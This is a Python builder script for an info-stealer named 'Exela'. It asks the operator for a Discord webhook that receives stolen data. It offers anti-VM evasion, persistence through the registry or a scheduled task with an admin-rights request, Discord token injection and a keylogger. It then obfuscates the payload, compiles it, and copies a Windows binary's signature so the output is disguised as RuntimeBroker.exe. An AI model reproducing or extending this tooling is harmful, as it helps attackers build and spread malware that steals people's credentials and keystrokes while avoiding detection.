import os, shutil, time, sys

class Build:
    def __init__(self) -> None:
        self.versionFile = os.getcwd() + "\\AssemblySettings\\version.txt"
        self.pyinstallerCommand = f"pyinstaller --onefile --noconsole --clean --noconfirm --version-file {self.versionFile} --upx-dir upx-4.0.2-win64 "
        self.useIcon = False
        self.injectKeylogger = "sexx"
        self.startup = "false"
        self.startupMethod = "regedit"
        self.antivmorospusu = "true"
        self.inject_dc = "false"
        self.compileToExe()
    def compileToExe(self):
        try:
            self.moduleInstaller()
            os.system("cls")
            getWebhook = str(input('Enter Your webhook URL : '))
            if "discordapp" in getWebhook:
                getWebhook = getWebhook.replace("discordapp", "discord")
            time.sleep(0.5)
            os.system("cls")
            getAntiVmReq = str(input('Yes/no\nDo you want to use Anti-VM : '))
            if getAntiVmReq.lower() == "n" or getAntiVmReq.lower() == "no":
                self.antivmorospusu = "false"
            else:
                self.antivmorospusu = "true"
            os.system("cls")
            getStartupReq = str(input('Yes/no\nDo you want to use Startup : '))
            if getStartupReq.lower() == "y" or getStartupReq.lower() == "yes":
                self.startup = "true"
                print("--------------------------------------------\n1-) HKCLM/HKLM Startup (This method copies the file to startup using the registry)\n2-)Schtask Startup (This method uses the task scheduler to save the file to the task scheduler and automatically restarts it when any user logs in, this method is more private than the other method but requires admin privilege)\n--------------------------------------------\n\n")
                getStartupMethod = input("1/2 Enter your selection: ")
                if getStartupMethod == "1":
                    self.startupMethod = "regedit"
                elif getStartupMethod == "2":
                    self.startupMethod = "schtasks"
                    self.pyinstallerCommand += "--uac-admin "
                else:
                    print("unkown Startup method, startup has been disabled.")
                    self.startup ="false"
                    self.startupMethod = None
            else:self.startup= "false"
            os.system("cls")
            getInjectioReq = str(input("yes/no\nDiscord injection : "))
            if getInjectioReq.lower() == "y" or getInjectioReq.lower() == "yes":
                self.inject_dc = "true"
            else:
                self.inject_dc = "false"
            getKeyloggerReq = str(input('Yes/no\nafter stealing process do u want to inject keylogger : '))
            if getKeyloggerReq.lower() == "y" or getKeyloggerReq.lower() == "yes":
                self.injectKeylogger = '%keyloggertrue%'
            else:
                self.injectKeylogger = "%keyloggerfalse%"
            getIcon = str(input("Yes/no\nDo you want to change the icon of the file : "))
            iconPath = None
            if getIcon.lower() == "yes" or getIcon.lower() == "y":
                self.useIcon = True
                getIconPath = input(str("icon file must be .ico otherwise the icon will not change\nEnter the path of the icon file : "))
                if not getIconPath.endswith(".ico"):
                    print("invalid icon\nIcon change has been disabled.")
                    self.useIcon = False
                else:
                    iconPath == getIconPath
            if self.useIcon == True:
                self.pyinstallerCommand += f"--icon={getIconPath} Obfuscated.py"
            else:self.pyinstallerCommand += "Obfuscated.py"
            with open("Exela.py", "r", encoding="utf-8", errors="ignore") as f:
                readedCode = f.read()
            replacedCode = readedCode.replace("%REPLACE_ME_FOR_QUiCADXD%", getWebhook[::-1]).replace('%AnTiVm%', self.antivmorospusu).replace("%StartuP%", self.startup).replace("%MethoD%", self.startupMethod).replace("%Inject_discord%", self.inject_dc).replace('%keyloggerinject???%', self.injectKeylogger)
            with open("stub.py", "w", encoding="utf-8", errors="ignore") as x:
                x.write(replacedCode)
            self.obfuscateFile()
            time.sleep(1)
            os.system(self.pyinstallerCommand)
        except Exception as e:
            os.system('cls')
            print("An error occurred while compiling your file\nplease contact the coder or check your python version : ", str(e))
            time.sleep(1)
            sys.exit(0)
        else:
            os.system('cls')
            print("Your File compiled was succesfully")
            time.sleep(1)
            self.singFile(os.getcwd() + "\\Signed\\Windows10Upgrade9252.exe", os.getcwd() + "\\dist\\Obfuscated.exe", "RuntimeBroker.exe")
     
    def obfuscateFile(self):
        os.system("cls")
        print("Obfuscating file pls wait")
        time.sleep(1)
        obfuscatorPATH = os.getcwd() + "\\Obfuscator\\obf.py"
        command = f"python {obfuscatorPATH} stub.py --junk"
        os.system(command)
            
    def moduleInstaller(self):
        try:
            os.system('cls')
            os.system('pip install pynput')
            os.system("pip install colorama")
            os.system("pip install cryptography")
            os.system("pip install psutil")
            os.system("pip install GPUtil")
            os.system("pip install wmi")
            os.system("pip install pycryptodome")
            os.system("pip install pypiwin32")
            os.system("pip install dhooks")
            os.system("pip install requests")
            os.system("pip install pyinstaller")
        except:
            os.system('cls')
            print("An error occurred while downloading modules, make sure your python version is higher than 3.5")
            sys.exit(0)
        else:
            os.system('cls')
            print("Modules successfully downloaded")
            time.sleep(1)
            
    def singFile(self, signedFile, inputFile, outputFile):
        try:
            os.system("cls")
            print("Signing your file pls wait")
            time.sleep(1.5)
            runCommand = f"python digital-sign.py -i {signedFile} -t {inputFile} -o {outputFile}"
            os.system(runCommand)
            time.sleep(1.5)
        except:
            os.system("cls")
            print("An error occurred while signing your file with a digital signature, please use the stub.exe file in the dist/stub.exe folder")
            self.clearJunkFiles()
        else:
            os.system('cls')
            print(f"Your File signed Succesffuly, your file is => {outputFile}")
            self.clearJunkFiles()
    def clearJunkFiles(self):
        try:
            os.remove('Obfuscated.py')
            os.remove('Obfuscated.spec')
            os.remove('stub.py')
            shutil.rmtree('build')
            shutil.rmtree('dist')
        except Exception as e:
            sys.exit(0)
        else:
            sys.exit(0)

if __name__ == '__main__':
    Build()
